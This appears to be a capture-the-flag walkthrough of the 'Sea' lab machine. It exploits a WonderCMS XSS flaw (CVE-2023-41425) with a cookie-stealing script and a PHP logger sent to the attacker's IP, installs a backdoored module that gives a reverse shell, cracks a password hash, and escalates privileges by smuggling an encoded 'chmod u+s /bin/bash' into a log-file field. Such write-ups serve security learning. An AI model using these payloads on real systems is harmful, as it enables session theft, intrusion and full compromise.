as always starting with nmap

`sudo nmap -sC -sV -p- -oN sea 10.10.11.28`
![[Pasted image 20240813000337.png]]

nothing just web (Stupid one)

nothing interesting in the website so , let's move to fuzzing

`feroxbuster  --url http://10.129.115.194 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 500,403,404

![[Pasted image 20240813000823.png]]

the license page 
```
MIT License

Copyright (c) 2019 turboblack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
```

![[Pasted image 20240813001042.png]]

so we are dealing with WondwerCMS

this CVE is interesting since we are on version 3.2.0 (check http://sea.htb/themes/bike/version)
https://github.com/prodigiousMind/CVE-2023-41425 

this script exploit  an xss to steal credential then use this creds to uplaod backdoored files

I will use the same plugins used in this exploit
```bash
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
```

we need to  change the ==rev.php== file on the zip 

```php
$VERSION = "1.0";
$ip = 'UR OWN IP'; // CHANGE THIS
$port = 1337;
```


then I  will host a web serve 

```bash
php -S 0.0.0.0:80
```

![[Pasted image 20240813003150.png]]

```bash
python3 exploit.py http://sea.htb/loginURL 10.10.14.224 1337
```

we need to find out a way to  send the link to the admin , since the web app is using ==php== let's fuzz for the .php file

```bash
feroxbuster  --url http://10.129.115.194  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 500,403,400 -x php 

```
![[Pasted image 20240813003629.png]]

![[Pasted image 20240813023000.png]]

once we fill the form , with the malicious link in the website field

```url
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.224/script.js"></script><form+action="
```

in the ==script.js==
```javascript
new Image().src='http://IP/index.php?c='+document.cookie
```

in the ==index.php==
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```


we will get the admin cookie in our web server
![[Pasted image 20240813023404.png]]
changing the cookies , guarantee more privilege in the website , we can now upload plugin

we can install our malicious plugins now , by tampering with the request sent from this button
![[Pasted image 20240813023604.png]]

```HTTP
GET /?installModule=http://IP/main.zip&directoryName=violet&type=themes&token=a5d00073e50332dd0ca6d448d4ccddc9449c7ae27828bb35cee8112d67debd58 HTTP/1.1
```

by visiting http://sea.htb/themes/revshell-main/rev.php

we should get shell on our listener 
![[Pasted image 20240813024341.png]]

this file got my intention
`/var/www/sea/data/database.js`
if we check his content we will find a hash
```
"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

we need to remove the escapers to crack it
```
"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q",
```

```bash
hashcat -a 0 -m 3200 --show hash                                       
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

this password got us  the  user ==amay==

another website is running on the port 8080 
```
amay@sea:~$ netstat -ntlp 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:56005         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

but we need some type of authorization to access it

```bash
amay@sea:~$ curl 127.0.0.1:8080
Unauthorized access
```

I will reuse the password of amay
![[Pasted image 20240813025058.png]]

I will forward  the port 8080 to my machine , so I can see what's going on in this website

```
ssh -L 7000:localhost:8080 amay@sea.htb -N
```
 on http://127.0.0.1:7000/
 ![[Pasted image 20240813025643.png]]

I tried to read files , like ==/root/root.txt== but that didn't work 
![[Pasted image 20240813025715.png]]
so I tried to inject malicious command 

to confirm that , I will ping myself
first listen on the pings
``
```bash
sudo tcpdump -i  tun0 icmp
```

```HTTP
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;ping+-c+1+10.10.14.224&analyze_log=
```

this works
![[Pasted image 20240813030024.png]]

I will run
```
chmod u+s /bin/bash
```

```http
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68&analyze_log=
```

![[Pasted image 20240813030229.png]]

![[Pasted image 20240813030247.png]]